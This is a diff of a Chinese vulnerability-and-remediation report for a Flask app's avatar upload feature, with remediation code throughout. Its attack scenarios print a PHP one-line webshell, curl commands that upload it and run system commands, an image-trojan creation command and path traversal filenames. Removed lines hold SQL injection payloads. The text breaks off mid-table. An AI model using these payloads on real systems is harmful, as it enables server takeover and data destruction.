@@ -1,626 +1,678 @@
-# 用户信息管理平台 — 漏洞检测与安全修复报告
+# 文件上传漏洞检测与安全修复报告
 
 **项目名称**：用户信息管理平台（User Management System）  
 **报告日期**：2026-07-09  
-**代码版本**：`5b0115d`  
-**仓库地址**：https://github.com/guikkttyy/gg1  
+**检测模块**：头像上传功能（`/upload`）  
 
 ---
 
 ## 目录
 
-1. [报告概述](#1-报告概述)
-2. [检测范围与方法](#2-检测范围与方法)
-3. [漏洞汇总清单](#3-漏洞汇总清单)
-4. [漏洞一：SQL 注入](#4-漏洞一sql-注入)
-5. [漏洞二：密码明文存储与明文比对](#5-漏洞二密码明文存储与明文比对)
-6. [漏洞三：前端页面泄露密码](#6-漏洞三前端页面泄露密码)
-7. [漏洞四：弱密码策略](#7-漏洞四弱密码策略)
-8. [漏洞五：硬编码弱密钥](#8-漏洞五硬编码弱密钥)
-9. [漏洞六：HTML 注释泄露管理员账号](#9-漏洞六html-注释泄露管理员账号)
-10. [漏洞七：路由装饰器缺失导致登出失效](#10-漏洞七路由装饰器缺失导致登出失效)
-11. [漏洞八：任意文件上传](#11-漏洞八任意文件上传)
-12. [漏洞九：路径遍历攻击](#12-漏洞九路径遍历攻击)
-13. [漏洞十：文件覆盖与无安全检查](#13-漏洞十文件覆盖与无安全检查)
-14. [漏洞修复总结](#14-漏洞修复总结)
-15. [残留风险与后续加固建议](#15-残留风险与后续加固建议)
+1. [漏洞概述](#1-漏洞概述)
+2. [检测方法](#2-检测方法)
+3. [漏洞一：任意文件上传](#3-漏洞一任意文件上传)
+4. [漏洞二：路径遍历攻击](#4-漏洞二路径遍历攻击)
+5. [漏洞三：文件覆盖与文件名冲突](#5-漏洞三文件覆盖与文件名冲突)
+6. [漏洞四：缺少 MIME 类型验证](#6-漏洞四缺少-mime-类型验证)
+7. [漏洞五：缺少文件内容验证](#7-漏洞五缺少文件内容验证)
+8. [综合修复方案](#8-综合修复方案)
+9. [攻击场景验证](#9-攻击场景验证)
+10. [修复前后代码对比](#10-修复前后代码对比)
+11. [残留风险与加固建议](#11-残留风险与加固建议)
 
 ---
 
-## 1. 报告概述
+## 1. 漏洞概述
 
-本报告对基于 Python Flask 构建的用户信息管理平台进行了全面的安全漏洞检测。检测范围涵盖身份认证模块、数据库操作模块、文件上传模块及前端模板，共发现 **10 项安全漏洞**，其中高危 6 项、中危 3 项、低危 1 项。截至报告日期，所有漏洞已完成修复。
+头像上传功能在初始实现时对用户上传的文件**未做任何安全检查**，攻击者可通过构造恶意文件实现远程代码执行、系统文件覆盖等严重攻击。本次检测共发现 **5 项文件上传相关漏洞**，其中高危 3 项、中危 2 项。
+
+### 漏洞汇总
+
+| 编号 | 漏洞名称 | 危险等级 | 攻击路径 |
+|------|----------|----------|----------|
+| FU-01 | 任意文件上传 | 🔴 高危 | 上传 `.php` 文件 → Web 访问执行 |
+| FU-02 | 路径遍历 | 🔴 高危 | 文件名包含 `../` → 覆盖系统文件 |
+| FU-03 | 文件覆盖 | 🟠 中危 | 同名文件覆盖 → 替换合法文件 |
+| FU-04 | 缺少 MIME 验证 | 🟠 中危 | 伪造 Content-Type → 绕过扩展名校验 |
+| FU-05 | 缺少文件内容验证 | 🔴 高危 | 图片马 → 绕过所有后缀检查 |
 
 ---
 
-## 2. 检测范围与方法
+## 2. 检测方法
 
-### 检测范围
-
-| 检测模块 | 涉及文件 | 代码行数 |
-|----------|----------|----------|
-| 身份认证（登录/登出） | `app.py`, `templates/login.html` | ~40 行 |
-| 用户注册 | `app.py`, `templates/register.html` | ~20 行 |
-| 用户搜索 | `app.py`, `templates/index.html` | ~20 行 |
-| 头像上传 | `app.py`, `templates/upload.html` | ~60 行 |
-| 前端模板 | `templates/*.html` | ~120 行 |
-| 数据库操作 | `app.py`（SQLite3） | ~30 行 |
-
-### 检测方法
-
-| 检测方式 | 说明 |
+| 检测手段 | 说明 |
 |----------|------|
-| 代码审计（Manual Code Review） | 逐行审查源代码中的安全隐患 |
-| 黑盒注入测试 | 对输入接口发送恶意 Payload 验证 |
-| 文件上传测试 | 尝试上传恶意文件（.php、图片马等） |
-| 配置审查 | 检查密钥管理、权限配置等 |
+| 代码审计 | 审查 `app.py` 中 `/upload` 路由的实现代码 |
+| 黑盒测试 | 使用 curl 模拟上传各类恶意文件 |
+| 边界测试 | 测试超长文件名、特殊字符、空文件等边界情况 |
+| 路径遍历测试 | 测试 `../`、`..\\`、绝对路径等路径穿越载荷 |
 
 ---
 
-## 3. 漏洞汇总清单
-
-| 编号 | 漏洞名称 | 模块 | 等级 | CVSS | 发现日期 | 状态 |
-|------|----------|------|------|------|----------|------|
-| V-01 | SQL 注入（注册接口） | 注册 | 🔴 高危 | 9.8 | 2026-07-07 | ✅ 已修复 |
-| V-02 | SQL 注入（搜索接口） | 搜索 | 🔴 高危 | 9.8 | 2026-07-07 | ✅ 已修复 |
-| V-03 | 密码明文存储与比对 | 登录 | 🔴 高危 | 7.5 | 2026-07-07 | ✅ 已修复 |
-| V-04 | 前端页面泄露密码 | 首页 | 🟠 中危 | 5.3 | 2026-07-07 | ✅ 已修复 |
-| V-05 | 弱密码策略 | 登录 | 🟠 中危 | 4.9 | 2026-07-07 | ✅ 已修复 |
-| V-06 | 硬编码弱密钥 | 全局 | 🟠 中危 | 5.6 | 2026-07-07 | ✅ 已修复 |
-| V-07 | HTML 注释泄露账号 | 登录页 | 🟡 低危 | 3.3 | 2026-07-07 | ✅ 已修复 |
-| V-08 | 路由装饰器缺失 | 登出 | 🟠 中危 | 5.0 | 2026-07-08 | ✅ 已修复 |
-| V-09 | 任意文件上传 | 上传 | 🔴 高危 | 8.1 | 2026-07-09 | ✅ 已修复 |
-| V-10 | 路径遍历与文件覆盖 | 上传 | 🔴 高危 | 7.5 | 2026-07-09 | ✅ 已修复 |
-
----
-
-## 4. 漏洞一：SQL 注入
+## 3. 漏洞一：任意文件上传
 
 ### 漏洞信息
 
 | 项目 | 内容 |
 |------|------|
-| 漏洞编号 | V-01 / V-02 |
-| 漏洞类型 | SQL Injection（SQL 注入） |
-| 危险等级 | 🔴 高危 |
-| CVSS 评分 | **9.8 / 10（Critical）** |
-| 攻击向量 | 网络 · 低复杂度 · 无需认证 |
-
-### 漏洞位置
-
-#### V-01：注册接口（`app.py` 第 85 行，修复前）
-
-```python
-# ❌ 修复前：f-string 拼接用户输入
-sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
-c.execute(sql)
-```
-
-四个表单字段全部直接拼接到 SQL 语句中，未做任何过滤或转义。
-
-#### V-02：搜索接口（`app.py` 第 105 行，修复前）
-
-```python
-# ❌ 修复前：f-string 拼接关键词
-sql = f"SELECT ... FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
-c.execute(sql)
-```
-
-URL 参数 `keyword` 直接拼接到 LIKE 查询中。
-
-### 攻击场景
-
-#### 场景 1：万能查询 — 泄露全部用户数据
-
-搜索框输入 `' OR 1=1 --`，SQL 变为：
-
-```sql
-SELECT ... WHERE username LIKE '%' OR 1=1 --%' OR email LIKE '%' OR 1=1 --%'
-```
-
-`OR 1=1` 恒为真，**返回数据库中所有用户数据**。
-
-#### 场景 2：联合查询 — 窃取密码
-
-搜索框输入 `' UNION SELECT id, password, username, email FROM users --`，SQL 变为：
-
-```sql
-SELECT id, username, email, phone FROM users WHERE username LIKE '%'
-UNION SELECT id, password, username, email FROM users --%'
-```
-
-**密码字段映射到前端表格中直接展示**。
-
-#### 场景 3：注册注入 — 删表攻击
-
-用户名输入 `test'); DELETE FROM users; --`，SQL 变为：
-
-```sql
-INSERT INTO users (...) VALUES ('test'); DELETE FROM users; --', ...)
-```
-
-**整个 users 表被清空，数据永久丢失**。
-
-### 修复方案
-
-将 f-string 拼接改为 **参数化查询**（Prepared Statement）：
-
-```python
-# ✅ 修复后：参数化查询，? 占位符传参
-sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
-c.execute(sql, (username, password, email, phone))
-```
-
-```python
-# ✅ 修复后
-like_param = f"%{keyword}%"
-sql = "SELECT ... WHERE username LIKE ? OR email LIKE ?"
-c.execute(sql, (like_param, like_param))
-```
-
-### 修复原理
-
-参数化查询严格区分 **SQL 语句结构** 和 **数据值**。用户输入中的 `'`、`--`、`;` 等特殊字符被数据库驱动自动转义为普通文本，不再具有 SQL 语法意义。
-
----
-
-## 5. 漏洞二：密码明文存储与明文比对
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-03 |
-| 漏洞类型 | Insecure Password Storage（密码不安全存储） |
-| 危险等级 | 🔴 高危 |
-| CVSS 评分 | **7.5 / 10（High）** |
-
-### 漏洞位置
-
-`app.py` 第 9-22 行（初始版本）：
-
-```python
-# ❌ 修复前：密码明文存储，== 明文比对
-USERS = {
-    "admin": {"password": "admin123"},
-    "alice": {"password": "alice2025"},
-}
-# ...
-if USERS[username]["password"] == password:  # 明文比对
-```
-
-### 风险分析
-
-| 风险场景 | 说明 |
-|----------|------|
-| 源代码泄露 | 密码直接暴露在版本控制中 |
-| 数据库泄露 | SQLite 文件被读取时密码明文可见 |
-| 时序攻击 | `==` 比对可通过响应时间逐字符推断密码 |
-| 密码复用 | 用户常用同一密码，一个泄露等于全部泄露 |
-
-### 修复方案
-
-```python
-from werkzeug.security import generate_password_hash, check_password_hash
-
-# ✅ 修复后：哈希存储
-USERS = {
-    "admin": {"password": generate_password_hash("Admin@123456")},
-}
-
-# ✅ 修复后：哈希比对（常量时间）
-if check_password_hash(USERS[username]["password"], password):
-```
-
-### 密码哈希算法说明
-
-Werkzeug 使用 `pbkdf2:sha256` 算法，迭代次数默认 600,000 次，并附加随机盐值。即使两个用户密码相同，哈希值也不同。
-
----
-
-## 6. 漏洞三：前端页面泄露密码
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-04 |
-| 漏洞类型 | Sensitive Data Exposure（敏感信息泄露） |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **5.3 / 10（Medium）** |
-
-### 漏洞位置
-
-`templates/index.html` 第 10 行（修复前）：
-
-```html
-<!-- ❌ 修复前：密码直接渲染到前端 -->
-<li><span class="label">密码：</span><span class="value">{{ user.password }}</span></li>
-```
-
-### 修复方案
-
-```html
-<!-- ✅ 修复后：移除密码显示项 -->
-```
-
-同时后端在数据传递前过滤密码字段：
-
-```python
-# 传递模板前过滤
-user_info = {k: v for k, v in USERS[username].items() if k != "password"}
-```
-
-### 双重保障机制
-
-| 层级 | 措施 |
-|------|------|
-| 后端 | 密码字段不传入 `render_template()` |
-| 前端 | 模板中无 `{{ user.password }}` 输出 |
-| 浏览器 | 密码不会出现在 HTML 源代码、缓存、截图中 |
-
----
-
-## 7. 漏洞四：弱密码策略
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-05 |
-| 漏洞类型 | Weak Password Policy（弱密码） |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **4.9 / 10（Medium）** |
-
-### 漏洞详情
-
-| 用户 | 旧密码 | 长度 | 包含大写 | 包含特殊符 | 暴力破解时间 |
-|------|--------|------|----------|-----------|-------------|
-| admin | `admin123` | 8 | ❌ | ❌ | < 1 小时 |
-| alice | `alice2025` | 10 | ❌ | ❌ | < 1 天 |
-
-### 修复后密码强度
-
-| 用户 | 新密码 | 长度 | 大写 | 小写 | 数字 | 特殊符 | 破解时间 |
-|------|--------|------|------|------|------|--------|---------|
-| admin | `Admin@123456` | 12 | ✅ | ✅ | ✅ | ✅ | > 数百年 |
-| alice | `Alice@2025!Secure` | 16 | ✅ | ✅ | ✅ | ✅ | > 数千年 |
-
----
-
-## 8. 漏洞五：硬编码弱密钥
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-06 |
-| 漏洞类型 | Hardcoded Secret Key（硬编码密钥） |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **5.6 / 10（Medium）** |
-
-### 漏洞位置（初始版本）
-
-```python
-# ❌ 修复前：硬编码弱密钥，所有部署实例使用相同密钥
-app.secret_key = "dev-key-2025"
-```
-
-### 风险分析
-
-- 攻击者可伪造 Flask session cookie
-- 所有部署该项目的实例共享同一密钥
-- 密钥泄露后，攻击者可冒充任意用户
-
-### 修复方案
-
-```python
-# ✅ 修复后：优先环境变量，否则随机生成
-app.secret_key = os.environ.get("SECRET_KEY", os.urandom(24).hex())
-```
-
-`os.urandom(24)` 生成 48 位十六进制随机字符串，不可预测，每次部署不同。
-
----
-
-## 9. 漏洞六：HTML 注释泄露管理员账号
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-07 |
-| 漏洞类型 | Information Disclosure（信息泄露） |
-| 危险等级 | 🟡 低危 |
-| CVSS 评分 | **3.3 / 10（Low）** |
-
-### 漏洞位置（修复前）
-
-`templates/login.html` 第 1 行：
-
-```html
-<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->
-```
-
-查看网页源代码即可获取管理员凭据。
-
-### 修复方案
-
-删除该行 HTML 注释。
-
----
-
-## 10. 漏洞七：路由装饰器缺失导致登出失效
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-08 |
-| 漏洞类型 | Broken Function（功能失效） |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **5.0 / 10（Medium）** |
-
-### 漏洞位置（中间版本）
-
-```python
-# ❌ 修复前：缺少 @app.route("/logout") 装饰器
-def logout():
-    session.clear()
-    return redirect("/")
-```
-
-由于编辑 `/search` 路由时丢失了 `/logout` 的路由装饰器，导致用户无法退出登录。
-
-### 修复方案
-
-```python
-# ✅ 修复后：补全路由装饰器
-@app.route("/logout")
-def logout():
-    session.clear()
-    return redirect("/")
-```
-
----
-
-## 11. 漏洞八：任意文件上传
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | V-09 |
+| 漏洞编号 | FU-01 |
 | 漏洞类型 | Arbitrary File Upload（任意文件上传） |
 | 危险等级 | 🔴 高危 |
 | CVSS 评分 | **8.1 / 10（High）** |
+| CWE 编号 | CWE-434（Unrestricted Upload of Dangerous File Type） |
 
-### 漏洞位置（修复前）
+### 漏洞描述
+
+上传功能**未对文件扩展名做任何检查**，攻击者可上传 `.php`、`.jsp`、`.asp`、`.exe`、`.sh` 等可执行文件。由于文件存储在 `static/uploads/` 目录下，Web 服务器会直接提供这些文件的 HTTP 访问，导致攻击者上传的 Webshell 可直接被访问和执行。
+
+### 漏洞位置
 
 ```python
-# ❌ 修复前：无任何文件类型检查
-f.save(save_path)
-file_url = f"/static/uploads/{f.filename}"
+# app.py（修复前）
+@app.route("/upload", methods=["GET", "POST"])
+def upload():
+    if request.method == "POST":
+        f = request.files.get("file")
+        if f and f.filename:
+            save_path = os.path.join(upload_dir, f.filename)
+            f.save(save_path)
+            file_url = f"/static/uploads/{f.filename}"  # 文件可直接 URL 访问
 ```
 
 ### 攻击场景
 
-攻击者可上传 `.php` 文件到 `static/uploads/` 目录，通过访问 `http://目标/static/uploads/shell.php` 直接执行。
+#### 场景 1：上传 PHP Webshell
 
-### 修复方案：三层检查
+攻击者构造一个一句话木马文件 `shell.php`：
+
+```php
+<?php @eval($_POST['cmd']); ?>
+```
+
+```bash
+curl -X POST http://目标:5000/upload \
+  -b "session=xxx" \
+  -F "file=@shell.php"
+```
+
+上传成功后返回 URL：
+
+```
+/static/uploads/shell.php
+```
+
+攻击者访问该 URL 并 POST 任意命令：
+
+```bash
+curl -X POST http://目标:5000/static/uploads/shell.php \
+  -d "cmd=system('whoami');"
+```
+
+**后果**：攻击者获得服务器的远程控制权限，可执行任意系统命令。
+
+#### 场景 2：上传恶意脚本
+
+| 文件类型 | 用途 | 危害 |
+|----------|------|------|
+| `.php` / `.phtml` | Webshell | 远程代码执行 |
+| `.jsp` / `.war` | Java Webshell | 服务器控制 |
+| `.asp` / `.aspx` | ASP Webshell | Windows 服务器控制 |
+| `.sh` / `.bat` | 脚本文件 | 命令执行 |
+| `.html` | 钓鱼页面 | 仿冒登录页窃取凭证 |
+
+### 修复方案
+
+建立白名单扩展名检查，仅允许图片格式：
 
 ```python
-# 第一层：扩展名检查
 allowed_extensions = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}
-ext = safe_filename.rsplit(".", 1)[-1].lower()
+ext = safe_filename.rsplit(".", 1)[-1].lower() if "." in safe_filename else ""
 if ext not in allowed_extensions:
-    error = "仅允许上传图片文件"
-
-# 第二层：MIME 类型检查
-allowed_mime = {"image/jpeg", "image/png", "image/gif", "image/webp", "image/bmp"}
-if f.mimetype and f.mimetype not in allowed_mime:
-    error = "不支持的文件类型"
-
-# 第三层：Magic Bytes 文件内容验证
-magic_bytes = f.read(8)
-# JPEG:  \xff\xd8\xff
-# PNG:   \x89PNG\r\n\x1a\n
-# GIF:   GIF87a / GIF89a
-# WebP:  RIFF....WEBP
-# BMP:   BM
-if not is_valid_image:
-    error = "文件内容与扩展名不匹配"
-```
-
-### 三层验证关系
-
-```
-用户上传文件
-    │
-    ▼
-第一关：扩展名检查 ──❌→ .php.jpg.png → 通过
-    │✅                  ↓
-    ▼                   ❌
-第二关：MIME 检查  ──→ 伪造 Content-Type → 通过
-    │✅                  ↓
-    ▼                   ❌
-第三关：Magic Bytes ──→ 文件头必须是真实图片格式 → 拦截图片马
+    error = "仅允许上传图片文件（jpg, jpeg, png, gif, webp, bmp）"
+    return render_template("upload.html", error=error, file_url=file_url)
 ```
 
 ---
 
-## 12. 漏洞九：路径遍历攻击
+## 4. 漏洞二：路径遍历攻击
 
 ### 漏洞信息
 
 | 项目 | 内容 |
 |------|------|
-| 漏洞编号 | V-10（子项） |
+| 漏洞编号 | FU-02 |
 | 漏洞类型 | Path Traversal（路径遍历） |
 | 危险等级 | 🔴 高危 |
 | CVSS 评分 | **7.5 / 10（High）** |
+| CWE 编号 | CWE-22（Improper Limitation of Pathname） |
 
-### 漏洞位置（修复前）
+### 漏洞描述
+
+代码直接使用用户提供的文件名拼接保存路径，未对文件名中的路径分隔符做任何过滤。攻击者可在文件名中插入 `../` 跳出上传目录，实现任意路径文件写入。
+
+### 漏洞位置
 
 ```python
-# ❌ 修复前：直接使用用户提供的文件名
+# app.py（修复前）
 save_path = os.path.join(upload_dir, f.filename)
 ```
 
 ### 攻击场景
 
-攻击者上传文件名为 `../../etc/cron.d/malicious`，拼接后路径变为：
+#### 场景 1：覆盖系统定时任务
+
+攻击者上传文件，文件名为 `../../../etc/cron.d/shell`：
 
 ```
-static/uploads/../../etc/cron.d/malicious
+save_path = static/uploads/../../../../etc/cron.d/shell
+         → /etc/cron.d/shell
 ```
 
-解析为 `/etc/cron.d/malicious`，实现 **任意文件写入**。
+拼接后的实际路径指向 `/etc/cron.d/shell`，覆盖系统定时任务配置文件。
+
+#### 场景 2：覆盖应用代码
+
+攻击者上传文件 `../../../app.py`：
+
+```
+save_path = static/uploads/../../../app.py
+         → /项目根目录/app.py
+```
+
+直接覆盖 Flask 应用主文件，插入恶意代码。
+
+#### 路径遍历载荷示例
+
+| 原始文件名 | 实际保存路径 | 攻击目标 |
+|------------|-------------|----------|
+| `../../etc/passwd` | `/etc/passwd` | 系统密码文件 |
+| `../../var/www/html/shell.php` | Web 目录 | Webshell |
+| `../../../app.py` | 应用目录 | 覆盖源代码 |
+| `..\\..\\..\\windows\\system32\\evil.dll` | Windows 系统目录 | DLL 劫持 |
 
 ### 修复方案
 
+使用 `os.path.basename()` 提取文件名，去除所有路径信息：
+
 ```python
-# ✅ 修复后：只取 basename，去除所有路径
+# ✅ 修复后
 safe_filename = os.path.basename(f.filename)
-# 输入： "../../etc/shell.php"  →  输出： "shell.php"
-# 输入： "/etc/passwd"          →  输出： "passwd"
 ```
+
+| 用户输入 | `os.path.basename()` 结果 |
+|----------|--------------------------|
+| `../../../etc/passwd` | `passwd` |
+| `../../app.py` | `app.py` |
+| `../../../etc/cron.d/shell` | `shell` |
+| `../../windows/system32/evil.dll` | `evil.dll` |
+| `normal.jpg` | `normal.jpg` |
 
 ---
 
-## 13. 漏洞十：文件覆盖与无安全检查
+## 5. 漏洞三：文件覆盖与文件名冲突
 
 ### 漏洞信息
 
 | 项目 | 内容 |
 |------|------|
-| 漏洞编号 | V-10（子项） |
-| 漏洞类型 | File Overwrite + Missing Validation |
+| 漏洞编号 | FU-03 |
+| 漏洞类型 | File Overwrite（文件覆盖） |
 | 危险等级 | 🟠 中危 |
+| CWE 编号 | CWE-363（Race Condition Enabling Link Following） |
 
-### 漏洞详情
+### 漏洞描述
 
-| 子问题 | 风险 | 修复方案 |
-|--------|------|----------|
-| 文件名冲突 | 同名文件互相覆盖 | UUID 随机重命名：`uuid.uuid4().hex.ext` |
-| 无大小限制 | 超大文件耗尽磁盘 | 设置 `MAX_CONTENT_LENGTH = 16MB` |
+使用用户提供的原始文件名保存文件，未做任何去重处理。两个用户上传同名文件时，后上传的文件会直接覆盖先上传的文件。
+
+### 攻击场景
+
+1. 合法用户上传头像 `avatar.jpg`，文件保存成功
+2. 攻击者上传恶意文件 `avatar.jpg`（实际内容为 PHP Webshell）
+3. 合法用户的头像文件被恶意文件覆盖
+4. 其他用户访问该头像时，触发恶意代码执行
 
 ### 修复方案
 
-```python
-# ✅ 修复后：UUID 重命名，防冲突防覆盖
-import uuid
-new_filename = f"{uuid.uuid4().hex}.{ext}"
-# 例如：avatar.jpg → a1b2c3d4e5f6a7b8c9d0e1f2.jpg
-```
+使用 UUID 随机重命名文件，杜绝文件名冲突：
 
 ```python
-# ✅ 修复后：限制上传大小
-app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16MB
+import uuid
+new_filename = f"{uuid.uuid4().hex}.{ext}"
+# 例如：avatar.jpg → a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6.jpg
+```
+
+| 原始文件名 | 修复前（安全问题） | 修复后（安全） |
+|------------|--------------------|---------------|
+| `avatar.jpg` | 直接保存为 `avatar.jpg` | 保存为 `a1b2c3...f2.jpg` |
+| `shell.php` | 直接保存为 `shell.php` | 被扩展名检查拦截 ❌ |
+| `avatar.jpg`（两个用户） | 后者覆盖前者 | 两个不同 UUID 文件名共存 |
+
+---
+
+## 6. 漏洞四：缺少 MIME 类型验证
+
+### 漏洞信息
+
+| 项目 | 内容 |
+|------|------|
+| 漏洞编号 | FU-04 |
+| 漏洞类型 | Missing MIME Validation（缺少 MIME 校验） |
+| 危险等级 | 🟠 中危 |
+
+### 漏洞描述
+
+即使增加了扩展名检查，攻击者仍可将恶意文件命名为 `shell.jpg` 尝试上传。缺少对 Content-Type 的验证使得伪造扩展名成为可能。
+
+### 修复方案
+
+验证 HTTP 请求中的 `Content-Type` 字段：
+
+```python
+allowed_mime = {"image/jpeg", "image/png", "image/gif", "image/webp", "image/bmp"}
+if f.mimetype and f.mimetype not in allowed_mime:
+    error = f"不支持的文件类型（MIME: {f.mimetype}）"
+    return render_template("upload.html", error=error, file_url=file_url)
+```
+
+| 上传文件 | Content-Type | 检查结果 |
+|----------|-------------|----------|
+| `shell.php` | `application/x-php` | ❌ 拦截 |
+| `shell.jpg`（实际是 PHP） | `application/x-php` | ❌ 拦截 |
+| `shell.jpg`（伪造 MIME） | `image/jpeg` | ⚠️ 通过（需要 Magic Bytes 进一步验证） |
+
+---
+
+## 7. 漏洞五：缺少文件内容验证
+
+### 漏洞信息
+
+| 项目 | 内容 |
+|------|------|
+| 漏洞编号 | FU-05 |
+| 漏洞类型 | Missing Content Validation（缺少文件内容校验） |
+| 危险等级 | 🔴 高危 |
+
+### 漏洞描述
+
+扩展名检查和 MIME 检查都可以被绕过。攻击者可以制作 **图片马**——在正常图片文件末尾追加恶意代码，文件后缀为 `.jpg`，MIME 为 `image/jpeg`，但实际包含可执行代码。
+
+### 图片马制作示例
+
+```bash
+# 制作图片马：正常图片 + PHP 代码
+echo '<?php @eval($_POST["cmd"]); ?>' >> normal.jpg
+# normal.jpg 仍是有效图片，但尾部包含恶意代码
+```
+
+如果服务器配置了将 `.jpg` 文件解析为 PHP（例如 `.htaccess` 或 Nginx 配置不当），图片马即可被执行。
+
+### 修复方案
+
+读取文件头部 **Magic Bytes（文件魔数/文件签名）** 验证文件真实格式：
+
+```python
+magic_bytes = f.read(8)
+f.seek(0)
+is_valid_image = False
+
+if ext in ("jpg", "jpeg"):
+    if magic_bytes.startswith(b"\xff\xd8\xff"):    # JPEG 文件头
+        is_valid_image = True
+elif ext == "png":
+    if magic_bytes.startswith(b"\x89PNG\r\n\x1a\n"):  # PNG 文件头
+        is_valid_image = True
+elif ext == "gif":
+    if magic_bytes.startswith(b"GIF87a") or magic_bytes.startswith(b"GIF89a"):  # GIF 文件头
+        is_valid_image = True
+elif ext == "webp":
+    if magic_bytes.startswith(b"RIFF") and magic_bytes[4:8] == b"WEBP":  # WebP 文件头
+        is_valid_image = True
+elif ext == "bmp":
+    if magic_bytes.startswith(b"BM"):    # BMP 文件头
+        is_valid_image = True
+
+if not is_valid_image:
+    error = "文件内容与扩展名不匹配，请上传真实图片文件"
+```
+
+### 常见图片格式 Magic Bytes
+
+| 格式 | 十六进制签名 | ASCII 签名 | 文件头长度 |
+|------|-------------|------------|-----------|
+| **JPEG** | `FF D8 FF E0` | `ÿØÿà` | 2+ 字节 |
+| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG␍␊␚␊` | 8 字节 |
+| **GIF87a** | `47 49 46 38 37 61` | `GIF87a` | 6 字节 |
+| **GIF89a** | `47 49 46 38 39 61` | `GIF89a` | 6 字节 |
+| **WebP** | `52 49 46 46 xx xx xx xx 57 45 42 50` | `RIFF....WEBP` | 12 字节 |
+| **BMP** | `42 4D` | `BM` | 2 字节 |
+
+---
+
+## 8. 综合修复方案
+
+### 五层安全过滤架构
+
+```
+用户上传文件
+    │
+    ▼
+┌─────────────────────────────────────┐
+│ 第一层：路径遍历防护                    │
+│ os.path.basename() 去除路径           │
+│ 输入: ../../etc/passwd → passwd      │
+└─────────────────┬───────────────────┘
+                  │ 通过
+                  ▼
+┌─────────────────────────────────────┐
+│ 第二层：扩展名白名单                    │
+│ 仅允许: jpg, jpeg, png, gif, webp,  │
+│         bmp                          │
+│ 拦截: php, exe, sh, jsp, asp ...    │
+└─────────────────┬───────────────────┘
+                  │ 通过
+                  ▼
+┌─────────────────────────────────────┐
+│ 第三层：MIME 类型校验                  │
+│ 验证 Content-Type 是否为图片类型       │
+│ 拦截: application/x-php 等           │
+└─────────────────┬───────────────────┘
+                  │ 通过
+                  ▼
+┌─────────────────────────────────────┐
+│ 第四层：Magic Bytes 文件签名验证        │
+│ 读取文件头 8 字节，验证真实格式          │
+│ 拦截: 图片马、后缀名伪造                │
+└─────────────────┬───────────────────┘
+                  │ 通过
+                  ▼
+┌─────────────────────────────────────┐
+│ 第五层：UUID 重命名                    │
+│ 防文件覆盖、防文件名猜测               │
+│ avatar.jpg → a1b2...c5d6.jpg         │
+└─────────────────┬───────────────────┘
+                  │ 通过
+                  ▼
+          ✅ 文件安全保存
+```
+
+### 修复后的完整代码
+
+```python
+@app.route("/upload", methods=["GET", "POST"])
+def upload():
+    if "username" not in session:
+        return redirect("/login")
+    error = None
+    file_url = None
+    if request.method == "POST":
+        f = request.files.get("file")
+        if f and f.filename:
+            # 第一层：路径遍历防护
+            safe_filename = os.path.basename(f.filename)
+
+            # 第二层：扩展名白名单
+            allowed_extensions = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}
+            ext = safe_filename.rsplit(".", 1)[-1].lower() if "." in safe_filename else ""
+            if ext not in allowed_extensions:
+                error = "仅允许上传图片文件"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第三层：MIME 类型校验
+            allowed_mime = {"image/jpeg", "image/png", "image/gif", "image/webp", "image/bmp"}
+            if f.mimetype and f.mimetype not in allowed_mime:
+                error = f"不支持的文件类型"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第四层：Magic Bytes 文件签名验证
+            magic_bytes = f.read(8)
+            f.seek(0)
+            is_valid_image = False
+            if ext in ("jpg", "jpeg") and magic_bytes.startswith(b"\xff\xd8\xff"):
+                is_valid_image = True
+            elif ext == "png" and magic_bytes.startswith(b"\x89PNG\r\n\x1a\n"):
+                is_valid_image = True
+            elif ext == "gif" and (magic_bytes.startswith(b"GIF87a") or magic_bytes.startswith(b"GIF89a")):
+                is_valid_image = True
+            elif ext == "webp" and magic_bytes.startswith(b"RIFF") and magic_bytes[4:8] == b"WEBP":
+                is_valid_image = True
+            elif ext == "bmp" and magic_bytes.startswith(b"BM"):
+                is_valid_image = True
+            if not is_valid_image:
+                error = "文件内容与扩展名不匹配"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第五层：UUID 重命名
+            import uuid
+            new_filename = f"{uuid.uuid4().hex}.{ext}"
+            upload_dir = os.path.join(app.root_path, "static", "uploads")
+            os.makedirs(upload_dir, exist_ok=True)
+            save_path = os.path.join(upload_dir, new_filename)
+            f.save(save_path)
+            file_url = f"/static/uploads/{new_filename}"
+        else:
+            error = "请选择一个文件"
+    return render_template("upload.html", error=error, file_url=file_url)
 ```
 
 ---
 
-## 14. 漏洞修复总结
+## 9. 攻击场景验证
 
-### 修复统计
+### 验证环境
 
-| 统计项 | 数值 |
-|--------|------|
-| 发现漏洞总数 | **10 项** |
-| 高危漏洞 | 6 项 |
-| 中危漏洞 | 3 项 |
-| 低危漏洞 | 1 项 |
-| 已修复 | **10 项（100%）** |
-| 修改文件数 | 9 个文件 |
-| 新增代码行 | ~200 行 |
+| 项目 | 配置 |
+|------|------|
